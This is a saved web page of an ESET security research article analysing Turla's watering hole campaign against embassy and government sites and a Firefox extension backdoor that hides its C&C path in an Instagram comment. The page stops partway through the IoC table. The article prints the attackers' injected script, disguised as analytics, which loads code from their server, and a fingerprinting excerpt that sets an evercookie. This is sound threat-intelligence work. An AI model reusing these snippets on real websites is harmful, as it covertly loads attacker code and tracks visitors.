<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Jean-Ian Boutin',
        'ArticleCategory': 'Cybercrime',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Turla’s watering hole campaign: An updated Firefox extension abusing Instagram | WeLiveSecurity</title>
<meta name="description" content="The Turla espionage group is still using watering hole techniques to redirect potentially interesting victims to their C&amp;C infrastructure."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram | WeLiveSecurity" />
<meta property="og:description" content="The Turla espionage group is still using watering hole techniques to redirect potentially interesting victims to their C&amp;C infrastructure." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:author" content="https://www.facebook.com/jiboutin" />
<meta property="article:section" content="Cybercrime" />
<meta property="article:published_time" content="2017-06-06T12:00:56+00:00" />
<meta property="article:modified_time" content="2017-09-04T12:24:55+00:00" />
<meta property="og:updated_time" content="2017-09-04T12:24:55+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/06/watering-hole-turla.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/06/watering-hole-turla.jpg" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="470" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="The Turla espionage group is still using watering hole techniques to redirect potentially interesting victims to their C&amp;C infrastructure." />
<meta name="twitter:title" content="Turla’s watering hole campaign: An updated Firefox extension abusing Instagram | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/06/watering-hole-turla.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel="alternate" href="https://www.welivesecurity.com/br/2017/06/06/campanha-se-aproveita-do-instagram/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2017/06/09/turla-attaques-point-deau-firefox/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/06/06/campana-watering-hole-de-turla-instagram/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2017/06/07/turla-watering-hole-firefox-erweiterung-missbraucht-instagram/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2017/06/06/campanha-se-aproveita-do-instagram/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2017/06/09/turla-attaques-point-deau-firefox/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/06/06/campana-watering-hole-de-turla-instagram/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/06/07/turla-watering-hole-firefox-erweiterung-missbraucht-instagram/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2017/06/06/campanha-se-aproveita-do-instagram/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2017/06/09/turla-attaques-point-deau-firefox/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/06/06/campana-watering-hole-de-turla-instagram/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/06/07/turla-watering-hole-firefox-erweiterung-missbraucht-instagram/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Turla’s watering hole campaign: An updated Firefox extension abusing Instagram</h1>
<div class="excerpt">The Turla espionage group is still using watering hole techniques to redirect potentially interesting victims to their C&C infrastructure.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/boutin/" title="Jean-Ian Boutin">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2013/01/jean-ianboutin-222x179.jpg" alt="Jean-Ian Boutin">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/boutin/" title="Jean-Ian Boutin">
                    Jean-Ian Boutin                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-06-06 14:00:56">6 Jun 2017 - 02:00PM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F&text=Turla’s watering hole campaign: An updated Firefox extension abusing Instagram%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F06%2F06%2Fturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>The Turla espionage group is still using watering hole techniques to redirect potentially interesting victims to their C&#038;C infrastructure.</p>
                            </div>

                            <p><em>Update, 21 June 2017: Due to our misunderstanding of communications with Google, the Firefox extension’s infection vector discussed below was wrongly described here on 06 June 2017; this is now corrected.  Apologies to Google and our readers for the unintentional misrepresentation in our original post.</em></p>
<p>Some of the tactics used in APT attacks die hard. A good example is provided by Turla’s watering hole campaigns. Turla, which has been targeting governments, government officials and diplomats for years – see, as an example, <a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/" target="_blank" rel="noopener noreferrer">this recent paper</a> – is still using watering hole techniques to redirect potentially interesting victims to their C&amp;C infrastructure. In fact, they have been using them since at least 2014 with very few variations in their modus operandi.</p>
<p>A watering hole attack compromises websites that are likely to be visited by targets of interest. The people behind Turla are apparently keen on targeting embassy websites. Indeed, there was a February 2017 blogpost by <a href="https://blogs.forcepoint.com/security-labs/curious-case-reconnaissance-campaign-targeting-ministry-and-embassy-sites" target="_blank" rel="noopener noreferrer">Forcepoint</a> highlighting some of the websites most recently compromised.</p>
<p>We, of course, are monitoring the developments of these campaigns closely and recently noticed them reusing a technique that we haven’t seen them use for several months.</p>
<h2>Initial compromise</h2>
<p>In the IoCs section below, there is a list of websites that have been used to redirect to Turla watering hole C&amp;Cs in the past. As is usual with this group, there are many websites directly related to embassies throughout the world.</p>
<p>The websites’ visitors will be redirected to a malicious server because of a snippet &#8211; inserted by the attacker &#8211; appended to the original page. The scripts we saw in the last few months were all similar to this one:</p>
<table>
<tbody>
<tr>
<td width="479">&lt;!&#8211; Clicky Web Analytics (start) &#8211;&gt;</p>
<p>&lt;script type=&#8221;text/javascript&#8221;&gt;// &lt;![CDATA[</p>
<p>var clicky_site_ids = clicky_site_ids || [];</p>
<p>clicky_site_ids.push(100673048);</p>
<p>(function() {</p>
<p>var s = document.createElement(&#8216;script&#8217;);</p>
<p>var a = &#8216;http://www.mentalhealthcheck.net/&#8217;;</p>
<p>var b = &#8216;update/counter.js&#8217;;</p>
<p>s.type = &#8216;text/javascript&#8217;; s.async = true;</p>
<p>s.src = &#8216;//static.getclicky.com/js&#8217;; s.src = a.concat(b);</p>
<p>( document.getElementsByTagName(&#8216;head&#8217;)[0] || document.getElementsByTagName(&#8216;body&#8217;)[0]).appendChild(s);</p>
<p>})();</p>
<p>// ]]&gt;&lt;/script&gt;</td>
</tr>
</tbody>
</table>
<p>The attackers added a reference to Clicky, a real time web analytics framework. They are adding this framework name in an attempt to legitimize the appended script to cursory, or non-expert, examination, although it is not actually used in the attack. We can see here that this injected script calls another script at <span style="font-family: 'courier new', courier, monospace;">mentalhealthcheck.net/update/counter.js.</span> This is a server the Turla gang has been using to push fingerprinting scripts – scripts that will gather information about the system it is running on – to interesting victims. A deceptive reference to the Google Analytics script was used in a similar fashion for a while, but now Clicky is what we see the most. You can find in the IoCs section the various watering hole C&amp;Cs that we saw in the last couple of months. All of these C&amp;Cs are compromised legitimate servers.</p>
<p>The next step in the attack is to distribute a fingerprinting JavaScript to interesting targets. To do this, the C&amp;C is filtering visitors using an IP range. If they are within the targeted IP range, they receive the fingerprinting script. If not, they just receive a benign script: a JS implementation of the MD5 hashing algorithm. Below we show an excerpt of the deobfuscated script that is received by victims coming from a targeted IP range:</p>
<table>
<tbody>
<tr>
<td width="479">function cb_custom() {</p>
<p>loadScript(&#8220;http://www.mentalhealthcheck.net/script/pde.js&#8221;, cb_custom1);</p>
<p>}</p>
<p>&nbsp;</p>
<p>function cb_custom1() {</p>
<p>PluginDetect.getVersion(&#8216;.&#8217;);</p>
<p>&nbsp;</p>
<p>myResults[&#8216;Java&#8217;]=PluginDetect.getVersion(&#8216;Java&#8217;);</p>
<p>myResults[&#8216;Flash&#8217;]=PluginDetect.getVersion(&#8216;Flash&#8217;);</p>
<p>myResults[&#8216;Shockwave&#8217;]=PluginDetect.getVersion(&#8216;Shockwave&#8217;);</p>
<p>myResults[&#8216;AdobeReader&#8217;]=PluginDetect.getVersion(&#8216;AdobeReader&#8217;) || PluginDetect.getVersion(&#8216;PDFReader&#8217;);</p>
<p>&nbsp;</p>
<p>var ec = new evercookie();</p>
<p>ec.get(&#8216;thread&#8217;, getCookie)</td>
</tr>
</tbody>
</table>
<p>This javascript will download a JS library called <span style="font-family: 'courier new', courier, monospace;">PluginDetect</span> that has the ability to collect information about plugins installed in the browser. The information collected is then sent to the C&amp;C server.</p>
<p>It will also try to install an evercookie, or so-called super cookie, that will track the user throughout his browsing, across all sites on the internet.</p>
<p>For those familiar with this group&#8217;s waterholing techniques, it is clear they are still using their old, publicly known tried-and-true methods.</p>
<h2>Firefox extension</h2>
<p>Through our monitoring of these watering hole campaigns, we happened upon a very interesting sample. Some of you may remember the <a href="http://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender-Whitepaper-PAC-A4-en_EN1.pdf" target="_blank" rel="noopener noreferrer">Pacifier APT</a> report by BitDefender describing a spearphishing campaign with a malicious Microsoft Word document sent to several institutions worldwide. These malicious documents would then drop a <a href="http://virusradar.com/en/glossary/backdoor" target="_blank" rel="noopener noreferrer">backdoor</a>. We now know that this report describes Skipper, a first stage backdoor used by the Turla gang.</p>
<p>That report also contains a description of a Firefox extension dropped by the same type of malicious document. It turns out we have found what most likely is an update of this Firefox extension. It is a JavaScript backdoor, different in terms of implementation to the one described in the Pacifier APT report, but with similar functionalities.</p>
<p><img class="aligncenter wp-image-94709" src="/wp-content/uploads/2017/06/extension_file.png" alt="Turla" width="727" height="512" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/06/extension_file.png 916w, https://www.welivesecurity.com/wp-content/uploads/2017/06/extension_file-300x211.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/06/extension_file-768x541.png 768w" sizes="(max-width: 727px) 100vw, 727px" /></p>
<p>We noticed that this extension could have been distributed through a forged copy of a Swiss security company&#8217;s website. Unsuspecting visitors to this website were asked to install this malicious extension. The extension is a simple backdoor, but with an interesting way of fetching its C&amp;C domain.</p>
<h2>The use of Instagram</h2>
<p>The extension uses a bit.ly URL to reach its C&amp;C, but the URL path is nowhere to be found in the extension code. In fact, it will obtain this path by using comments posted on a specific Instagram post. The one that was used in the analyzed sample was a comment about a photo posted to the Britney Spears official Instagram account.</p>
<p><img class="aligncenter wp-image-94708" src="/wp-content/uploads/2017/06/britney_instagram_square.png" alt="" width="686" height="511" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/06/britney_instagram_square.png 822w, https://www.welivesecurity.com/wp-content/uploads/2017/06/britney_instagram_square-300x223.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/06/britney_instagram_square-768x572.png 768w" sizes="(max-width: 686px) 100vw, 686px" /></p>
<p>© <a href="https://www.instagram.com/p/BO8gU41A45g/" target="_blank" rel="noopener noreferrer">https://www.instagram.com/p/BO8gU41A45g/</a></p>
<p>The extension will look at each photo’s comment and will compute a custom hash value. If the hash matches 183, it will then run this regular expression on the comment in order to obtain the path of the bit.ly URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">(?:\\u200d(?:#|@)(\\w)</span></p>
<p>Looking at the photo’s comments, there was only one for which the hash matches 183. This comment was posted on February 6, while the original photo was posted in early January. Taking the comment and running it through the regex, you get the following bit.ly URL:</p>
<p>http://bit.ly/2kdhuHX</p>
<p>Looking a bit more closely at the regular expression, we see it is looking for either <span style="font-family: 'courier new', courier, monospace;">@|#</span> or the Unicode character <span style="font-family: 'courier new', courier, monospace;">\200d</span>. This character is actually a non-printable character called &#8216;Zero Width Joiner&#8217;, normally used to separate emojis. Pasting the actual comment or looking at its source, you can see that this character precedes each character that makes the path of the bit.ly URL:</p>
<p><span style="font-family: 'courier new', courier, monospace;">smith2155&lt;200d&gt;#2hot ma&lt;200d&gt;ke lovei&lt;200d&gt;d to &lt;200d&gt;her, &lt;200d&gt;uupss &lt;200d&gt;#Hot &lt;200d&gt;#X</span></p>
<p>When resolving this shortened link, it leads to <span style="font-family: 'courier new', courier, monospace;">static.travelclothes.org/dolR_1ert.php</span> , which was used in the past as a watering hole C&amp;C by the Turla crew.</p>
<p>As is the case with all bit.ly links, it is possible to get statistics on who clicked the link.</p>
<p><img class="aligncenter wp-image-94707" src="/wp-content/uploads/2017/06/bitly_stats.png" alt="Turla" width="858" height="607" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/06/bitly_stats.png 1240w, https://www.welivesecurity.com/wp-content/uploads/2017/06/bitly_stats-300x212.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/06/bitly_stats-768x543.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/06/bitly_stats-1024x724.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/06/bitly_stats-601x426.png 601w" sizes="(max-width: 858px) 100vw, 858px" /></p>
<p>As seen above, there were only 17 hits recorded on this link in February, right around the time the comment was posted. However, this is quite a low number and might indicate that it was only a test run.</p>
<h2>Technical analysis</h2>
<p>This Firefox extension implements a simple backdoor. It will first gather information on the system it is running on and send it to the C&amp;C, encrypted using AES. This is very similar to what the extension described in the Pacifier APT white paper is doing.</p>
<p>The backdoor component has the ability to run four different types of commands:</p>
<ul>
<li>execute arbitrary file</li>
<li>upload file to C&amp;C</li>
<li>download file from C&amp;C</li>
<li>read directory content &#8211; send a file listing, along with sizes and dates, to C&amp;C</li>
</ul>
<p>While we believe this to be some type of test, the next version of the extension &#8211; if there is one &#8211; is likely to be very different. There are several APIs that are used by the extension that will disappear in future versions of Firefox.</p>
<p>For example, it uses <span style="font-family: 'courier new', courier, monospace;">XPCOM</span> to write files to disk and <span style="font-family: 'courier new', courier, monospace;">sdk/system/child_process</span> to launch a process. These can only be used by add-ons that will be superseded by WebExtensions starting with Firefox 57. From that version onwards, Firefox will no longer load add-ons, thus preventing the use of these APIs.</p>
<h2>Conclusion</h2>
<p>The fact that the Turla actors are using social media as a way to obtain its C&amp;C servers is quite interesting. This behavior has already been observed in the past by other threat crews such as the <a href="https://www.welivesecurity.com/2014/05/20/miniduke-still-duking/" target="_blank" rel="noopener noreferrer">Dukes</a>. Attackers using social media to recover a C&amp;C address are making life harder for defenders. Firstly, it is difficult to distinguish malicious traffic to social media from legitimate traffic. Secondly, it gives the attackers more flexibility when it comes to changing the C&amp;C address as well as erasing all traces of it. It is also interesting to see that they are recycling an old way of fingerprinting a victim and finding new ways to make the C&amp;C retrieval a bit more difficult.</p>
<p>For any inquiries, or to make sample submissions related to the subject, contact us at: <a href="mailto:threatintel@eset.com" target="_blank" rel="noopener noreferrer">threatintel@eset.com</a>.</p>
<h2>Acknowledgements</h2>
<p>We would like to thank Clement Lecigne from Google’s Threat Analysis Group for his help researching this campaign.</p>
<h2>IoCs</h2>
<p>Firefox extension hash</p>

<table id="tablepress-320" class="tablepress tablepress-id-320">
<thead>
<tr class="row-1 odd">
	<th class="column-1">File name</th><th class="column-2">SHA-1</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">html5.xpi</td><td class="column-2">5ba7532b4c89cc3f7ffe15b6c0e5df82a34c22ea</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">html5.xpi</td><td class="column-2">8e6c9e4582d18dd75162bcbc63e933db344c5680</td>
</tr>
</tbody>
</table>

<p>Observed compromised websites redirecting to fingerprinting servers</p>
<p>As of this writing all these sites are now clean or pointing to dead fingerprinting servers.</p>

<table id="tablepress-321" class="tablepress tablepress-id-321">
<thead>
<tr class="row-1 odd">
	<th class="column-1">URL</th><th class="column-2">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">hxxp://www.namibianembassyusa.org</td><td class="column-2">Namibia Embassy – USA</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">hxxp://www.avsa.org</td><td class="column-2">African Violet Society of America</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">hxxp://www.zambiaembassy.org</td><td class="column-2">Zambian Embassy – USA</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">hxxp://russianembassy.org</td><td class="column-2">Russian Embassy – USA</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">hxxp://au.int</td><td class="column-2">African Union</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">hxxp://mfa.gov.kg</td><td class="column-2">Ministry of Foreign Affairs – Kyrgyzstan</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">hxxp://mfa.uz</td><td class="column-2">Ministry of Foreign Affairs – Uzbekistan</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">hxxp://www.adesyd.es</td><td class="column-2">ADESyD - Asociación de Diplomados Españoles en Seguridad y Defensa</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">hxxp://www.bewusstkaufen.at</td><td class="column-2">web portal for sustainable consumption in Austria</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">hxxp://www.cifga.es</td><td class="column-2">Cifga Laboratory working on development of marine toxin standards</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">hxxp://www.jse.org</td><td class="column-2">Juventudes Socialistas de España (JSE)</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">hxxp://www.embassyofindonesia.org</td><td class="column-2">Embassy of Indonesia – USA</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">hxxp://www.mischendorf.at</td><td class="column-2">town of Mischendorf – Austria</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">hxxp://www.vfreiheitliche.at</td><td class="column-2">Political party in Bregenz, Austria</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">hxxp://www.xeneticafontao.com</td><td class="column-2">Fontao Genetics, S.A. established in 1998 is responsible for the management of the Centre for Animal Selection and Reproduction of Galicia breeds Holstein, Rubia Gallega</td>
</tr>
<tr class="row-17 odd">
